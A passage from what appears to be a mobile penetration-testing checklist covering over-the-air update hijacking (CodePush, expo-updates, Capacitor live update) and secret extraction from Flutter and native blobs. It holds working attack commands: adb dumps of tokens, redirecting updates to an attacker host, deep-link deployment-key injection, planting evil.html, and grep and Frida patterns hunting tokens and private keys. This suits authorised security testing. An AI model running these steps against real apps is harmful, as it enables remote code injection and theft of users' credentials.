  adb shell "run-as <pkg> ls -laR app_webview/Default/'Local Storage'/leveldb app_webview/Default/IndexedDB"
  adb exec-out run-as <pkg> tar c app_webview/Default 2>/dev/null > webview.tar && tar xf webview.tar
  # Flutter:
  adb shell "run-as <pkg> cat shared_prefs/FlutterSharedPreferences.xml"
  adb shell "run-as <pkg> cat shared_prefs/FlutterSecureStorage.xml"
  # Unity / Xamarin:
  adb shell "run-as <pkg> cat shared_prefs/<pkg>.v2.playerprefs.xml"
  adb shell "run-as <pkg> ls -la shared_prefs/"
  # cross-reference against the key names you already have:
  grep -aiE 'token|jwt|refresh|session|pin|password|card|otp|entitle|premium' hbc.strings out_dir/pp.txt | sort -u
  ```
- **Proof:** A JWT, refresh token, PAN or PIN readable in plaintext from the pulled file, **plus** a replay of
  that token against the API returning the victim's data. The replay is the finding.
- **Escalation:** -> D11 for the storage-model analysis; -> D15 for the replay; combine with the
  `/_capacitor_file_` primitive (D19-049) to make the read remote rather than local.
- **Ruled out when:** The stores contain only non-sensitive configuration, or the sensitive values are
  wrapped by a Keystore-backed key with `setUserAuthenticationRequired` in force (prove it by attempting the
  unwrap in D19-037's shape and observing `UserNotAuthenticatedException`). "It is in the app sandbox" is not
  a rule-out — but nor is an unencrypted non-sensitive value a finding.

### D19-025 · Establish whether the app can replace its own code over the air at all

| | |
|---|---|
| **Severity ceiling** | Support (the precondition for the two P1s below) |
| **VRT** | n/a directly |
| **Attacker** | AM-09 |
| **Applies to** | React Native with CodePush or expo-updates; Cordova/Ionic/Capacitor with a live-update plugin |
| **Maps to** | CodePush `docs/setup-android.md` (`strings.xml` `CodePushDeploymentKey`; `MainApplication.getJSBundleFile()` override); `CodePush.java` (`getCustomPropertyFromStringsIfExist("PublicKey")` / `("ServerUrl")`, default `mServerUrl = "https://codepush.appcenter.ms/"`); expo `UpdatesConfiguration.kt`; MASWE-0049 (CWE-494), MASWE-0048; ATT&CK T1407 |

- **Test:** OTA JS/web delivery converts the app into a remote-code-execution surface whose trust anchor is a
  server and, optionally, a signature. First establish that the channel exists and where it points. Note the
  Android 14 read-only mandate (`setReadOnly()`) applies to **DEX, JAR and APK** files — it does **not** cover
  JavaScript or Dart bundles, and teams routinely misread it as having secured their OTA.
- **How:**
  ```bash
  # CodePush
  grep -nE 'CodePushDeploymentKey|CodePushServerUrl|CodePushPublicKey' out/res/values/strings.xml
  grep -rn 'com\.microsoft\.codepush\.react\.CodePush' out/sources | head
  grep -a -n 'codepush\|deploymentKey' hbc.strings | head
  # expo-updates
  grep -nE 'expo\.modules\.updates\.' out/AndroidManifest.xml
  # Cordova / Capacitor live update
  grep -rniE 'hot.?code.?push|live.?update|deploy|appflow|ionic-deploy|updateUrl|channel' \
    out/res/xml/config.xml out/assets/capacitor.config.json out/assets/www/cordova_plugins.js 2>/dev/null
  grep -rn 'setServerBasePath\|setServerAssetPath\|WebViewLocalServer' out/sources | head
  # any custom loader
  grep -rn 'DexClassLoader\|PathClassLoader\|InMemoryDexClassLoader\|loadScriptFromFile' out/sources | head
  # on-device evidence of a channel that has already run
  adb shell "run-as <pkg> ls -laR files/ | head -80"
  adb shell "run-as <pkg> ls -laR files/ | grep -iE 'ionic|dist|snapshot|www|CodePush|expo'"
  ```
- **Proof:** A deployment key plus server URL in `strings.xml`, or `expo.modules.updates.EXPO_UPDATE_URL` in
  the merged manifest, together with a `getJSBundleFile()` override returning `CodePush.getJSBundleFile()`.
- **Escalation:** -> D19-026 (expo), D19-027 (CodePush), D19-030 (Cordova/Capacitor), D19-028 (channel
  override), D19-029 (rollback). This item also changes what "the app" means in your report's scope section
  (-> D19-003).
- **Ruled out when:** No CodePush strings, no `expo.modules.updates.*` meta-data, no live-update plugin in
  `cordova_plugins.js` / `capacitor.plugins.json`, no `loadScriptFromFile` override, and a `find` over the
  app's data directory after a full walkthrough returns no downloaded bundle or web payload. Then the APK's
  code is the only code and the OTA items below are not applicable.

### D19-026 · expo-updates with no code-signing certificate, or `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS=true`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1). The nearest literal node is `insecure_data_transport.executable_download.no_secure_integrity_check` (P4, CWE-353/354/494) — cite it, then request P1 on the demonstrated arbitrary-code-execution chain |
| **Attacker** | AM-09 malicious backend/CDN; AM-06 network attacker where TLS is the only remaining control |
| **Applies to** | Expo and bare RN apps using expo-updates |
| **Maps to** | expo `UpdatesConfiguration.kt` meta-data keys `CODE_SIGNING_CERTIFICATE`, `CODE_SIGNING_METADATA`, `CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN`, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS`, and `UpdatesController.overrideConfiguration()`; MASWE-0049 (CWE-494); ATT&CK T1407 |

- **Test:** expo-updates verifies an update only when a code-signing certificate is configured. If
  `CODE_SIGNING_CERTIFICATE` is absent, or `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` is `true`, the only thing
  protecting the app's code is TLS to the update host — and Expo's own documentation is explicit that without
  code signing, "ISPs, CDNs, cloud providers, and even EAS itself" are in the trust path.
- **How:**
  ```bash
  grep -nE 'expo\.modules\.updates\.(CODE_SIGNING_CERTIFICATE|CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|CODE_SIGNING_METADATA|CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN)' out/AndroidManifest.xml
  grep -nE 'expo\.modules\.updates\.(EXPO_UPDATE_URL|EXPO_RUNTIME_VERSION|EXPO_UPDATES_CHECK_ON_LAUNCH|ENABLE_EXPO_UPDATES_PROTOCOL_V0_COMPATIBILITY_MODE|DISABLE_ANTI_BRICKING_MEASURES)' out/AndroidManifest.xml
  # demonstrate: implement the Expo Updates protocol on a host you control and point the device at it
  mitmproxy --set block_global=false -s redirect_expo.py       # rewrite the manifest request to your host
  adb shell am force-stop <pkg> && adb shell monkey -p <pkg> 1
  adb shell "run-as <pkg> ls -laR files/.expo-internal/"
  ```
  Relevant `app.json` keys on the build side: `updates.url`, `updates.enabled`, `updates.checkAutomatically`
  (`ON_LOAD` / `ON_ERROR_RECOVERY` / `NEVER` / `WIFI_ONLY`), `updates.fallbackToCacheTimeout`,
  `updates.codeSigningCertificate`.
- **Proof:** Your bundle executing in the victim app after nothing more than a restart and with no reinstall
  — an added screen, a `console.log` marker in logcat, or an outbound beacon from the app's process — paired
  with the before/after bundle identity capture in D19-031 showing an unchanged `versionCode` and
  `lastUpdateTime`.
- **Escalation:** Arbitrary code in the app's UID and origin: steal every user's session (-> D13), read local
  storage (-> D11), call every native module (-> D19-018), pivot into the WebView bridge (-> D10). Also
  re-enable any client-side auth path the app disabled (-> D19-074). -> D17 supply chain.
- **Ruled out when:** `CODE_SIGNING_CERTIFICATE` is present, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` is absent
  or `false`, and a manifest you serve with a valid-looking but wrongly-signed body is **rejected** — show the
  rejection in logcat. A certificate configured but never checked is the interesting middle case: prove the
  rejection empirically rather than reading the meta-data alone.

### D19-027 · CodePush with no `CodePushPublicKey` — no bundle signature verification

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); baseline `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) |
| **Attacker** | AM-09; AM-06 where TLS is the only control; AM-01 for anyone who obtains the deployment key |
| **Applies to** | React Native + `react-native-code-push` |
| **Maps to** | `CodePush.java` (`private static String mPublicKey;`, `getCustomPropertyFromStringsIfExist("PublicKey")`, `getPublicKeyByResourceDescriptor(...)` throwing `CodePushInvalidPublicKeyException("Specified public key is empty")`, default `mServerUrl = "https://codepush.appcenter.ms/"`); `CodePushConstants.java` (`BUNDLE_JWT_FILE = ".codepushrelease"`, `STATUS_FILE = "codepush.json"`); CodePush README (`CheckFrequency.ON_APP_START` default); MASWE-0049 |

- **Test:** CodePush verifies the downloaded bundle only when a public key is configured — `mPublicKey` is
  checked against the `.codepushrelease` JWT inside the package. With no public key the runtime accepts
  whatever the server sends, or whatever anyone who can impersonate the server or obtain the deployment key
  sends.
- **How:**
  ```bash
  grep -n 'CodePushPublicKey' out/res/values/strings.xml || echo "NO PUBLIC KEY -> unsigned OTA"
  grep -n 'CodePushServerUrl'  out/res/values/strings.xml    # non-default server?
  grep -n 'CodePushDeploymentKey' out/res/values/strings.xml # the key itself ships inside the APK
  # after an OTA has landed, confirm what is live and whether it was signed:
  adb shell "run-as <pkg> cat files/CodePush/codepush.json"
  adb shell "run-as <pkg> find files/CodePush -name '.codepushrelease'"     # present => signed release
  adb shell "run-as <pkg> find files/CodePush -name 'index.android.bundle' -exec ls -l {} \;"
  ```
- **Proof:** No `CodePushPublicKey` string resource, no `.codepushrelease` JWT beside the downloaded bundle,
  and an intercepted or redirected update response resulting in your JS executing after `restartApp` — with
  the D19-031 hash pair as the decisive artefact.
- **Escalation:** Remote code execution in the app UID. Note separately, and state it in the report, that the
  **deployment key is embedded in the APK**, so anyone who extracts it can enumerate or target that
  deployment even without impersonating the server.
- **Ruled out when:** `CodePushPublicKey` is present in `strings.xml`, a `.codepushrelease` JWT accompanies
  the live package on disk, and a bundle you serve without a valid signature is refused (logcat shows the
  CodePush verification failure and the app falls back to the previous package). Extracting the deployment
  key alone is **not** a finding — see the Graveyard.

### D19-028 · Runtime override of the OTA update channel reachable from a deep link or bridge

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-02 remote one-click |
| **Applies to** | React Native with CodePush or expo-updates |
| **Maps to** | `CodePush.java` (`public void setDeploymentKey(String deploymentKey)`; constructors taking `serverUrl`; CodePush docs: "this key will override the 'default' one that was provided in your app's … files"); expo `UpdatesConfiguration.kt` (`UpdatesController.overrideConfiguration()`, keys `updateUrl`, `requestHeaders`, `runtimeVersion`, `checkOnLaunch`, `codeSigningCertificate`) |

- **Test:** Both OTA runtimes allow the update source to be changed at runtime. If any of that plumbing is
  reachable from a deep link, a WebView message, a push payload or an exported component, the attacker — not
  the vendor — chooses where the app's code comes from, and the signature configuration becomes irrelevant
  because `overrideConfiguration` can also replace `codeSigningCertificate`.
- **How:**
  ```bash
  grep -a -nE 'setDeploymentKey|deploymentKey|serverUrl|overrideConfiguration|updateUrl|runtimeVersion' hbc.strings
  hermes-decomp xref ext/assets/index.android.bundle --query 'deploymentKey'
  hermes-decomp xref ext/assets/index.android.bundle --query 'overrideConfiguration'
  grep -rn 'UpdatesController.overrideConfiguration' out/sources | head
  # then trace the argument backwards to its source and drive it:
  adb shell am start -a android.intent.action.VIEW -d "<scheme>://<route>?deploymentKey=<yours>" <pkg>
  ```
- **Proof:** A JS code path that sets the deployment key or update URL from a value tracing back to a deep-link
  parameter, a push `data` field or a WebView message — demonstrated end to end, with your update server
  receiving the check-in and your bundle executing.
- **Escalation:** One-click, remote code-source takeover; chains with D19-026/D19-027's impact set.
- **Ruled out when:** The override APIs are absent from the bundle and the DEX, or every call site passes a
  compile-time constant you can read. Trace the argument, do not merely count occurrences of the symbol.

### D19-029 · OTA rollback and downgrade as a security-control bypass

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null — rated on the control the old bundle lacks); or the specific vulnerability class the rollback target reintroduces |
| **Attacker** | AM-03 zero-permission local app (corrupting the current bundle requires only the app's own writable cache in the `run-as`/rooted case); AM-09 for the served-downgrade variant |
| **Applies to** | React Native with CodePush or expo-updates |
| **Maps to** | `CodePushConstants.java` (`PREVIOUS_PACKAGE_KEY`, `CURRENT_PACKAGE_KEY`, `FAILED_UPDATES_KEY`, `LATEST_ROLLBACK_INFO_KEY`, `LATEST_ROLLBACK_PACKAGE_HASH_KEY`, `LATEST_ROLLBACK_COUNT_KEY`); CodePush README (automatic rollback keeps a copy of the previous update); expo `UpdatesConfiguration.kt` (`DISABLE_ANTI_BRICKING_MEASURES`) |

- **Test:** CodePush keeps the previous package and rolls back on failure; expo-updates has anti-bricking
  measures that can be switched off. Check whether a device can be pinned to a known-vulnerable bundle the
  vendor believes is retired.
- **How:**
  ```bash
  adb shell "run-as <pkg> cat files/CodePush/codepush.json"       # currentPackage / previousPackage
  adb shell "run-as <pkg> cat shared_prefs/CodePush.xml"          # CODE_PUSH_FAILED_UPDATES, LATEST_ROLLBACK_INFO
  grep -n 'DISABLE_ANTI_BRICKING_MEASURES' out/AndroidManifest.xml
  # force a rollback: corrupt the current bundle so the update is marked failed, then relaunch
  adb shell "run-as <pkg> sh -c 'printf x >> files/CodePush/<hash>/<app>/index.android.bundle'"
  adb shell am force-stop <pkg> && adb shell monkey -p <pkg> 1
  adb shell "run-as <pkg> cat files/CodePush/codepush.json"       # now shows the previous package as current
  ```
- **Proof:** The app reverting to `previousPackage` (visible in `codepush.json`) and the old, vulnerable
  behaviour returning — demonstrate the reintroduced defect, not merely the version change.
- **Escalation:** Whatever the older bundle's missing fix was. Pair with D19-003 in the report: a JS-layer fix
  the client believes is deployed is not durable.
- **Ruled out when:** The rollback target carries the same security fix (compare the two bundles' strings for
  the patched code path), or the runtime refuses to run a package whose hash is not the current release. A
  rollback that returns to an equally-patched bundle is Informational.

### D19-030 · Cordova / Capacitor live-update payload substitution

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-09 |
| **Applies to** | Cordova, Ionic and Capacitor apps with a live-update / hot-code-push plugin |
| **Maps to** | Capacitor `Bridge.java` (`localServer.hostAssets(DEFAULT_WEB_ASSET_DIR)` with `DEFAULT_WEB_ASSET_DIR = "public"`, and the configurable `getServerBasePath` plumbing); MASWE-0049 |

- **Test:** The web-stack frameworks have the same problem in a different shape: a plugin downloads a new
  `www`/`public` payload and the WebView serves it. In a bridged WebView that is not "web content" — it is
  every D10 primitive granted to the update server.
- **How:**
  ```bash
  grep -rniE 'hot.?code.?push|live.?update|appflow|ionic-deploy|updateUrl|channel' \
    out/res/xml/config.xml out/assets/capacitor.config.json out/assets/www/cordova_plugins.js 2>/dev/null
  grep -rn 'setServerBasePath\|setServerAssetPath\|WebViewLocalServer' out/sources | head
  adb shell "run-as <pkg> ls -laR files/ | grep -iE 'ionic|dist|snapshot|www'"
  # substitute and restart
  adb shell "run-as <pkg> sh -c 'cat > files/<served-dir>/index.html'" < evil.html
  adb shell am force-stop <pkg> && adb shell monkey -p <pkg> 1
  ```
- **Proof:** A downloaded web payload directory on device that the WebView serves from, plus your
  `index.html` rendering in the app after restart, with the bridge object (`androidBridge` / `_cordovaNative`)
  defined in the console of your page.
- **Escalation:** Script execution in the bridged origin -> D19-049 (`/_capacitor_file_` sandbox read),
  D19-051 (plugin invocation), D19-050 (SSRF from the device) -> token exfiltration -> D15 -> account
  takeover.
- **Ruled out when:** No live-update plugin is registered, the served base path is the read-only APK asset
  directory (`getServerBasePath` returns the default `public`), and no writable directory under `files/` is
  referenced by `WebViewLocalServer`. If a plugin exists and verifies a signature over the payload,
  demonstrate the rejection of an unsigned payload.

### D19-031 · Capture OTA findings with before/after bundle identity, not a screenshot

| | |
|---|---|
| **Severity ceiling** | Support (this is what makes a P1 OTA finding undeniable) |
| **VRT** | n/a (evidence control) |
| **Attacker** | n/a |
| **Applies to** | React Native with CodePush or expo-updates; Cordova/Capacitor live update |
| **Maps to** | `CodePushConstants.DEFAULT_JS_BUNDLE_NAME`, `CODE_PUSH_FOLDER_PREFIX`, `STATUS_FILE`; facebook/hermes `BytecodeFileHeader.sourceHash` |

- **Test:** For any OTA/code-delivery finding the decisive evidence is that the running code changed without a
  reinstall. A screenshot of injected behaviour alone invites "you sideloaded a modified APK".
- **How:**
  ```bash
  # before
  adb shell "run-as <pkg> find files -name 'index.android.bundle' -exec md5sum {} \;" > before.txt
  adb shell dumpsys package <pkg> | grep -E 'versionCode|lastUpdateTime|firstInstallTime' >> before.txt
  apksigner verify --print-certs base.apk >> before.txt
  # ... deliver the attacker bundle, restart ...
  adb shell "run-as <pkg> find files -name 'index.android.bundle' -exec md5sum {} \;" > after.txt
  adb shell dumpsys package <pkg> | grep -E 'versionCode|lastUpdateTime|firstInstallTime' >> after.txt
  diff before.txt after.txt
  ```
- **Proof:** A changed bundle hash with **unchanged `versionCode`, `lastUpdateTime` and signing certificate**,
  plus a recording of the injected behaviour. Apply the five-screenshot state-change pattern around it:
  pre-state (original behaviour), the bug (the swapped response in the proxy), negative post-state (the
  original bundle hash is gone), positive post-state (the new hash and your behaviour), and the side effect
  (your collector receiving data from the app's process). Mask the session cookie and any real PII, but leave
  the bundle hashes, the package name, your own attacker identifiers, trace ids and JSON key names visible —
  the triager needs those to correlate.
- **Escalation:** n/a — this is the artefact set that stops a P1 being downgraded.
- **Ruled out when:** n/a. Always capture this pair for an OTA claim; if you cannot produce a hash delta with
  a static `versionCode`, you have not demonstrated the finding.

### D19-032 · Flutter: distinguish release AOT from debug/profile — `kernel_blob.bin` in a store build

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (null) when it also enables the Dart VM service; otherwise Informational/Low |
| **Attacker** | AM-01 for the artefact; AM-03/AM-06 if the VM service is reachable |
| **Applies to** | Flutter Android |
| **Maps to** | MASTG-TECH-0156 (Reverse Engineering Flutter Applications) |

- **Test:** A debug or profile Flutter build ships `kernel_blob.bin`, `isolate_snapshot_data` and
  `vm_snapshot_data` under `assets/flutter_assets/` and is dramatically easier to analyse than AOT. Finding
  those in a production APK is itself the observation; the finding is what they enable.
- **How:**
  ```bash
  unzip -l target.apk | grep -E 'flutter_assets/(kernel_blob\.bin|isolate_snapshot_data|vm_snapshot_data)'
  unzip -l target.apk | grep -E 'lib/[^/]+/libapp\.so'
  strings ext/lib/arm64-v8a/libapp.so | grep -m1 -E '^[0-9a-f]{32}$'     # Dart snapshot hash
  # is the VM service listening?
  adb logcat | grep -iE 'Observatory|VM service|Dart VM service listening'
  adb shell "cat /proc/net/tcp /proc/net/tcp6" | grep -i ' 0A '          # any LISTEN socket
  curl -s http://127.0.0.1:<port>/ | head                                 # from an adb shell
  ```
- **Proof:** `kernel_blob.bin` present in a build you verified is the store artefact
  (`apksigner verify --print-certs`), and — for the escalation — the Dart VM service URL from logcat opening
  in a browser.
- **Escalation:** Dart kernel is far more readable than AOT and may retain assertions and debug entry points
  -> D19-033/D19-035 become trivial. A reachable VM service is remote control of the isolate -> D17.
- **Ruled out when:** Only `libapp.so` is present with no `kernel_blob.bin`, no `vm_snapshot_data`, and no VM
  service line appears in logcat across a full app lifecycle including background/resume. That is a normal
  release AOT build.

### D19-033 · Flutter: string-mine the Dart AOT snapshot — this always works

| | |
|---|---|
| **Severity ceiling** | Support (routinely produces the P1 inputs) |
| **VRT** | n/a directly |
| **Attacker** | n/a |
| **Applies to** | Flutter apps, all release builds including `--obfuscate` (obfuscation renames symbols; it does not touch constants) |
| **Maps to** | MASTG-TECH-0156, MASTG-TOOL-0116 (blutter) |

- **Test:** jadx gives only the thin Java shell. The router, WebView configuration, API authentication and
  business logic all live in the Dart AOT snapshot — which jadx cannot decompile but which keeps literals
  readable. This is the step whose absence makes an entire Flutter app look clean.
- **How:**
  ```bash
  unzip -o split_config.arm64_v8a.apk 'lib/arm64-v8a/libapp.so' 'lib/arm64-v8a/libflutter.so' -d native
  # some builds name it lib*flutter_artifacts.so instead:
  APP=$(ls native/lib/arm64-v8a/libapp.so native/lib/arm64-v8a/lib*flutter_artifacts.so 2>/dev/null | head -1)
  strings -n 6 "$APP" > app_strings.txt
  grep -iE 'https?://|/api/|/v[0-9]+/|/dashboards|/reporting|/embed' app_strings.txt | sort -u
  grep -iE 'JavaScriptChannel|addJavaScriptChannel|callFunctionInNativeApp|getAuthenticatedEmbedUrl' app_strings.txt
  grep -iE 'allowedHost|isAllowed|instanceHostname|sandbox|Domains' app_strings.txt
  grep -E '^/[a-z0-9_/-]{3,}$' app_strings.txt | sort -u | head -40      # candidate Dart routes
  grep -aiE 'api[_-]?key|token|secret|BEGIN (RSA|EC|PRIVATE)|supabase|stripe|aws' app_strings.txt
  # and the asset side, which is plain files:
  unzip -o target.apk 'assets/flutter_assets/*' -d fl && ls fl/assets/flutter_assets | head
  unzip -p target.apk 'assets/flutter_assets/NOTICES*' 2>/dev/null | strings | grep -iE '^[a-z0-9_]+ [0-9]+\.[0-9]+' | head -60
  ```
- **Proof:** Recovered route regexes, MethodChannel and JS-channel names, host allow-lists and backend
  hostnames that appear nowhere in the DEX. One engagement recovered a `__gci`/`JsChannel` bridge, an
  `AxLWebView`, an `_axLSandboxDomains` allow-list and a first-party backend host purely from this pass.
- **Escalation:** JS-channel names -> D10 bridge testing; routes -> D19-041/D19-042 and D09; hosts and paths
  -> D19-011 and D15; key material -> D19-036/D19-037.
- **Ruled out when:** `strings -n 6` over the snapshot returns only Dart/Flutter framework symbols and no
  first-party hostname, path or channel name — which in practice means you have the wrong file (check for an
  ABI split, D19-002) or the app genuinely has no network layer. Verify by confirming at least one hostname
  you already observed in the proxy appears in the dump.

### D19-034 · Flutter: recover Dart symbols with Blutter, and fall back to reFlutter when it cannot build

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | Flutter release (AOT) builds. Blutter is **arm64-only** and takes an extracted `lib/arm64-v8a` directory, not an APK |
| **Maps to** | MASTG-TECH-0156, MASTG-TOOL-0116 (blutter), MASTG-TOOL-0100 (reFlutter — "dart.cc is modified to print classes, functions and some fields") |

- **Test:** Dart AOT snapshots resist normal reversing (custom registers and calling conventions, sequential
  class metadata, an undocumented and evolving format). Blutter builds a Dart-VM analyser matching the
  engine's version and emits symbolised assembly plus an object-pool dump; reFlutter instead patches the
  engine so the app dumps its own class/function/field table at runtime.
- **How:**
  ```bash
  unzip -o target.apk "lib/*" -d app_extracted
  # Blutter first — it needs cmake, ninja and capstone, and the Dart version string from libflutter.so .rodata
  strings app_extracted/lib/arm64-v8a/libflutter.so | grep -m1 -E 'Dart VM version|^[0-9]+\.[0-9]+\.[0-9]+ '
  python3 blutter.py app_extracted/lib/arm64-v8a out_dir
  ls out_dir/      # asm/*  pp.txt  objs.txt  blutter_frida.js
  grep -rn 'ensureInitialized\|::init\b' out_dir/asm/ | head
  grep -rniE 'isPremium|entitlement|verify|validate|checkRoot|isJailbroken|licen[cs]e' out_dir/asm/ | head -40
  frida -U -f <pkg> -l out_dir/blutter_frida.js --no-pause

  # Fallback — reFlutter, when Blutter will not build for this Dart version
  pip3 install reflutter && reflutter target.apk
  java -jar uber-apk-signer.jar --apks <patched>.apk && adb install -r <signed>.apk
  adb -d shell "cat /data/data/<pkg>/dump.dart" > dump.dart
  grep -nE 'class |Function|0x' dump.dart | head -60
  nm -D app_extracted/lib/arm64-v8a/libapp.so | grep -i IsolateSnapshotInstructions
  # add the _kDartIsolateSnapshotInstructions offset to dumped offsets to get real VM addresses
  ```
- **Proof:** Either symbolised output — a reconstructed `main` showing named call edges such as
  `bl #0x570d8c ; [package:flutter/src/widgets/binding.dart] WidgetsFlutterBinding::ensureInitialized` and
  `bl #0x59a98c ; [package:get_secure_storage/src/storage_impl.dart] GetSecureStorage::init` (which
  incidentally tells you which storage plugin holds the secrets) — or, from reFlutter, a `dump.dart` on device
  containing the app's class hierarchy, function signatures, code offsets and field values.
- **Escalation:** `pp.txt` -> D19-035; named functions -> Frida hooks for D19-038 and D19-040;
  `blutter_frida.js` is the instrumentation template.
- **Ruled out when:** Blutter builds and produces `asm/` files naming real first-party packages — then you
  have symbols and the fallback is unnecessary. The documented failure to expect: Google first-party "mara"
  builds export a **combined `_kDartSnapshotData`** symbol instead of the split
  `_kDartVmSnapshotData`/`_kDartIsolateSnapshotData` that Blutter expects, and pin an internal Dart dev
  version, so Blutter's C++ analyser will not compile without a source port. Blutter's own README lists
  "Obfuscated app (still missing many functions)" as an open TODO, so expect partial recovery there — record
  the specific build error, then fall back to D19-033.

### D19-035 · Flutter: harvest the Dart object pool for endpoints, keys and crypto parameters

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Flutter release AOT builds, arm64, including `--obfuscate` |
| **Maps to** | MASTG-TECH-0156, MASTG-TOOL-0116 (blutter), MASTG-TOOL-0144 (gitleaks) |

- **Test:** Every string constant, class name and crypto parameter the app uses is reachable from the AOT
  snapshot's object pool — including in obfuscated builds, where names are mangled but constants are not.
  `pp.txt` is usually the fastest place in the whole domain to find endpoints, JWTs, keys, IVs, feature flags
  and C2 paths.
- **How:**
  ```bash
  python3 blutter.py ext/lib/arm64-v8a out_dir
  grep -aiE 'https?://|/api/|/v[0-9]+/' out_dir/pp.txt | sort -u
  grep -aiE 'secret|token|apikey|iv|salt|BEGIN (RSA )?PRIVATE KEY|AES|HMAC|nonce=' out_dir/pp.txt
  grep -anE 'plugins\.flutter\.io|dev\.flutter|MethodChannel' out_dir/pp.txt | sort -u | head -40
  less out_dir/objs.txt            # nested object dump: maps, lists, const class instances
  gitleaks detect -s out_dir/pp.txt --no-git --verbose
  # some constants live in .rodata rather than the pool:
  strings -n 8 ext/lib/arm64-v8a/libapp.so | grep -aiE 'https?://|BEGIN .*PRIVATE KEY|/api/'
  ```
- **Proof:** `pp.txt` lines carrying your target's real hostnames, and `asm/` files naming real package paths
  (`[package:flutter_secure_storage/...]`, `[package:dio/...]`) — then the live validation of any credential
  per D19-012.
- **Escalation:** Endpoints -> D19-011 and D15; signing keys -> D19-037/D19-038 and offline request forgery;
  storage plugin names -> D19-024 and D11; channel names -> D19-040.
- **Ruled out when:** Blutter produced a `pp.txt` you have actually read end to end and it contains no
  first-party host, path, key or crypto constant. An empty grep with an unread `pp.txt` is not a rule-out —
  quote the line count you covered.

### D19-036 · Flutter: resolve pool-relative loads and Smi encoding to reconstruct an embedded key

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cryptographic_weakness.key_reuse.inter_environment` (P2) where one static key covers every environment |
| **Attacker** | AM-01 (offline, from the public APK) |
| **Applies to** | Flutter release builds, including `--obfuscate` |
| **Maps to** | MASTG-TECH-0156 (`PP`/`THR` register annotations in Blutter output), MASTG-TOOL-0116 |

- **Test:** Two mechanics make Dart constants look like noise. (1) Dart AOT keeps the object pool in `x27`
  (`PP`); pool loads are an `add`+`ldr` pair, and without resolving them every constant is an anonymous
  offset. (2) Small integers are Smi-tagged, so a key built character-by-character from immediates decodes as
  `value = raw >> 1`. Obfuscation does not touch either.
- **How:**
  ```
  add x16, x27, #0x24, lsl #12
  ldr x16, [x16, #0x280]        ; -> pool entry at 0x24280 — look it up in pp.txt
  ```
  ```bash
  grep -n '0x24280' out_dir/pp.txt
  grep -nE 'LoadImmediate|#0x[0-9a-f]{2}\b' out_dir/asm/*.txt | head -60
  ```
  ```python
  raw = [0x82, 0xE4, 0xBA]          # the immediates in constructor order
  print(''.join(chr(b >> 1) for b in raw))
  ```
  ```bash
  # then confirm the derivation chain in the assembly:
  grep -nE 'fromCharCodes|sha256|utf8|IV_SALT|AES|CBC|PKCS7' out_dir/asm/*.txt out_dir/pp.txt | head
  ```
  Note that Dart `String` objects use 32-bit compressed pointers and a Smi-encoded length field — apply the
  same `>> 1` when reading lengths by hand.
- **Proof:** Decoding the immediates yields a printable key string, and decrypting the app's on-device
  database with it returns plaintext matching what the UI shows. The worked case derived the AES-256 key as
  `SHA-256(key)` and the CBC IV as the first 16 bytes of `SHA-256(key + "IV_SALT")`, with AES-CBC/PKCS#7
  confirmed from the mode and padding identifiers in the object pool.
- **Escalation:** A static per-build key means every user's local vault decrypts with one key recoverable from
  the public APK -> offline decryption of any exfiltrated database (-> D11); if the same constant seeds
  request signing it also forges API calls (-> D19-038, D15).
- **Ruled out when:** The key material is fetched from the server after authentication, or derived from a
  Keystore-backed key with `setUserAuthenticationRequired` — demonstrate by hooking the derivation and showing
  the input is not a snapshot constant. A hardcoded value that only obfuscates a public identifier is not a
  key; say which it is.

### D19-037 · Flutter, Unity and .NET: private keys and signing material inside the native blob

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Flutter (`libapp.so`), Unity IL2CPP (`libil2cpp.so`), Xamarin/MAUI assemblies — anywhere DEX-oriented secret scanners do not look |
| **Maps to** | MASWE-0004 (CWE-798); MASTG-TOOL-0144 (gitleaks) |

- **Test:** Cross-platform builds bury PEM blobs and HMAC seeds in the native blob. Scan the file statically,
  and also scan the loaded module at runtime, because some keys are assembled at init and never exist on disk
  as a contiguous string.
- **How:**
  ```bash
  strings -n 20 ext/lib/arm64-v8a/libapp.so    | grep -a -n -- '-----BEGIN'
  strings -n 20 ext/lib/arm64-v8a/libil2cpp.so | grep -a -n -- '-----BEGIN'
  grep -a -n -- '-----BEGIN' out_dir/pp.txt
  grep -rna -- '-----BEGIN' out/assemblies/out/*.dll
  ```
  ```javascript
  // runtime module scan — catches keys assembled at init
  // frida -U -f <pkg> -q -e "$(cat scan.js)"
  var m = Process.getModuleByName('libapp.so');
  Memory.scan(m.base, m.size, '2d 2d 2d 2d 2d 42 45 47 49 4e', {     // "-----BEGIN"
    onMatch: function (a) { console.log(a, Memory.readUtf8String(a, 64)); }, onComplete: function () {} });
  Memory.scan(m.base, m.size, '2f 61 70 69 2f', {                    // "/api/"
